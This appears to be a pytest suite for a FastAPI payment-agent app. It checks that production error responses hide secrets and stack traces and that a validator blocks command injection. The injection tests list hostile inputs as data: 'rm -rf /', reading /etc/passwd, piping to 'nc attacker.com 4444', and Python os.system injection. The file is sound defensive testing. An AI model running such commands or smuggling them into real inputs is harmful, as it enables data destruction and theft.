"""
Tests for error response security - ensuring no sensitive information leaks in error responses.

This test suite verifies that:
1. Error messages don't contain stack traces in production
2. Database connection details are not exposed
3. Internal implementation details are hidden
4. Generic error messages are returned in production mode
5. Command injection is prevented
"""

import pytest
from unittest.mock import Mock, patch
from fastapi import HTTPException
from fastapi.requests import Request
import json


class TestErrorResponsesNoLeakage:
    """Test that error responses don't leak sensitive information."""

    def test_general_exception_handler_no_stack_trace_in_production(self):
        """Test that general exception handler doesn't expose stack traces in production."""
        from src.core.errors import general_exception_handler
        from src.core.config import settings

        # Mock request
        request = Mock(spec=Request)

        # Create a complex exception with sensitive info
        exc = ValueError("Internal error: Could not connect to secret-api-key-12345")

        # Mock settings to be in production (debug=False)
        with patch.object(settings, 'debug', False):
            import asyncio
            response = asyncio.run(general_exception_handler(request, exc))

            # Parse response content
            content = json.loads(response.body.decode())

            # Verify no sensitive info in error message
            assert "secret-api-key-12345" not in content.get('error', '')
            assert content.get('detail') is None  # No detail in production

            # Should have generic error message
            assert content.get('error') == "Internal server error"

    def test_safe_error_message_mapping(self):
        """Test that specific error types map to safe messages."""
        from src.core.errors import create_safe_error_message
        from src.core.config import settings

        # Test in production mode
        with patch.object(settings, 'debug', False):
            # Various error types
            errors = [
                ValueError("Invalid input"),
                Exception("Some random error with sensitive data"),
                ConnectionError("Connection to internal service failed"),
            ]

            for error in errors:
                safe_msg = create_safe_error_message(error)
                # Should be a generic message, not the original error
                assert safe_msg != str(error)
                assert "sensitive" not in safe_msg.lower()
                assert "internal" not in safe_msg.lower()

    def test_create_error_response_hides_detail_in_production(self):
        """Test that error response hides detail in production."""
        from src.core.errors import create_error_response
        from src.core.config import settings

        with patch.object(settings, 'debug', False):
            response = create_error_response(
                status_code=500,
                message="Internal error",
                detail="Sensitive database: postgresql://user:pass@host/db"
            )

            content = json.loads(response.body.decode())

            # Detail should be None in production
            assert content.get('detail') is None
            assert content.get('error') == "Internal error"

    def test_create_error_response_shows_detail_in_debug(self):
        """Test that error response shows detail in debug mode."""
        from src.core.errors import create_error_response
        from src.core.config import settings

        with patch.object(settings, 'debug', True):
            response = create_error_response(
                status_code=500,
                message="Internal error",
                detail="Debug information"
            )

            content = json.loads(response.body.decode())

            # Detail should be shown in debug
            assert content.get('detail') == "Debug information"

    def test_sqlalchemy_error_sanitization(self):
        """Test that SQLAlchemy errors are sanitized."""
        from src.core.errors import create_safe_error_message
        from src.core.config import settings

        with patch.object(settings, 'debug', False):
            # Simulate SQLAlchemy error with connection string
            error = Exception("SQLAlchemyError: could not connect to postgresql://user:pass@db:5432/prod")
            safe_msg = create_safe_error_message(error)

            # Should return generic fallback message (Exception type not in safe_messages)
            assert "postgresql://" not in safe_msg
            assert "password" not in safe_msg
            assert "An error occurred while processing your request" == safe_msg

    def test_redis_error_sanitization(self):
        """Test that Redis errors are sanitized."""
        from src.core.errors import create_safe_error_message
        from src.core.config import settings

        with patch.object(settings, 'debug', False):
            error = Exception("RedisError: Connection to redis://:password@internal-cache:6379 failed")
            safe_msg = create_safe_error_message(error)

            # Should return generic fallback message
            assert "redis://" not in safe_msg
            assert "password" not in safe_msg
            assert "An error occurred while processing your request" == safe_msg

    def test_authentication_error_sanitization(self):
        """Test that authentication errors don't leak token details."""
        from src.core.errors import create_safe_error_message
        from src.core.config import settings

        with patch.object(settings, 'debug', False):
            error = Exception("AuthenticationError: Invalid token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...")
            safe_msg = create_safe_error_message(error)

            # Should return generic fallback message
            assert "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" not in safe_msg
            assert "An error occurred while processing your request" == safe_msg

    def test_generic_error_fallback(self):
        """Test that unknown error types get generic fallback message."""
        from src.core.errors import create_safe_error_message
        from src.core.config import settings

        with patch.object(settings, 'debug', False):
            # Custom error type not in the safe_messages dict
            class CustomError(Exception):
                pass

            error = CustomError("Custom error with sensitive info: secret123")
            safe_msg = create_safe_error_message(error)

            # Should use generic fallback
            assert "secret123" not in safe_msg
            assert "An error occurred while processing your request" == safe_msg

    def test_error_response_structure(self):
        """Test that error responses have correct structure."""
        from src.core.errors import ErrorResponse

        # Create error response
        response = ErrorResponse(
            error="Test error",
            detail="Some detail"
        )

        # Verify structure
        assert response.error == "Test error"
        assert response.detail == "Some detail"

        # Test with no detail
        response_no_detail = ErrorResponse(
            error="Test error"
        )
        assert response_no_detail.detail is None


class TestSafeExceptionClasses:
    """Test the safe exception classes."""

    def test_safe_exception_basic(self):
        """Test SafeException base class."""
        from src.core.errors import SafeException

        exc = SafeException("Test message", {"key": "value"})
        assert exc.message == "Test message"
        assert exc.detail == {"key": "value"}

    def test_payment_error(self):
        """Test PaymentError class."""
        from src.core.errors import PaymentError

        exc = PaymentError("Payment failed", {"amount": 100})
        assert exc.message == "Payment failed"
        assert exc.detail == {"amount": 100}

    def test_service_not_found_error(self):
        """Test ServiceNotFoundError class."""
        from src.core.errors import ServiceNotFoundError

        exc = ServiceNotFoundError("Service not found")
        assert exc.message == "Service not found"

    def test_insufficient_balance_error(self):
        """Test InsufficientBalanceError class."""
        from src.core.errors import InsufficientBalanceError

        exc = InsufficientBalanceError("Insufficient balance", {"balance": 50, "required": 100})
        assert exc.message == "Insufficient balance"
        assert exc.detail == {"balance": 50, "required": 100}

    def test_daily_limit_exceeded_error(self):
        """Test DailyLimitExceededError class."""
        from src.core.errors import DailyLimitExceededError

        exc = DailyLimitExceededError("Daily limit exceeded")
        assert exc.message == "Daily limit exceeded"

    def test_paygent_error(self):
        """Test PaygentError class."""
        from src.core.errors import PaygentError

        exc = PaygentError("Application error", {"code": "ERR_001"})
        assert exc.message == "Application error"
        assert exc.details == {"code": "ERR_001"}


class TestInputValidation:
    """Test input validation for command injection prevention."""

    def test_validate_command_input_blocks_dangerous_patterns(self):
        """Test that validate_command_input blocks dangerous shell patterns."""
        from src.core.errors import validate_command_input

        dangerous_commands = [
            "pay 10 USDC to service && rm -rf /",
            "pay 10 USDC to service; cat /etc/passwd",
            "pay 10 USDC to service | nc attacker.com 4444",
            "pay 10 USDC to `whoami`",
            "pay 10 USDC to $(malicious)",
            "pay 10 USDC to service > /dev/null",
            "pay 10 USDC to service < /etc/passwd",
        ]

        for cmd in dangerous_commands:
            with pytest.raises(ValueError):
                validate_command_input(cmd)

    def test_validate_command_input_allows_safe_commands(self):
        """Test that safe commands pass validation."""
        from src.core.errors import validate_command_input

        safe_commands = [
            "pay 10 USDC to service",
            "swap 10 CRO for USDC",
            "check balance",
            "pay 100 USDC to alice@example.com",
        ]

        for cmd in safe_commands:
            # Should not raise
            result = validate_command_input(cmd)
            assert result == cmd.strip()

    def test_validate_command_input_blocks_long_commands(self):
        """Test that very long commands are rejected."""
        from src.core.errors import validate_command_input

        long_cmd = "pay " + "1" * 10000 + " USDC to service"

        with pytest.raises(ValueError):
            validate_command_input(long_cmd)

    def test_validate_command_input_empty_command(self):
        """Test that empty commands are rejected."""
        from src.core.errors import validate_command_input

        with pytest.raises(ValueError):
            validate_command_input("")

        with pytest.raises(ValueError):
            validate_command_input("   ")

    def test_validate_command_input_blocks_python_injection(self):
        """Test that Python injection attempts are blocked."""
        from src.core.errors import validate_command_input

        python_commands = [
            "pay 10 USDC to __import__('os').system('ls')",
            "pay 10 USDC to globals()",
            "pay 10 USDC to locals()",
            "pay 10 USDC to exec('malicious')",
            "pay 10 USDC to eval('malicious')",
        ]

        for cmd in python_commands:
            with pytest.raises(ValueError):
                validate_command_input(cmd)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
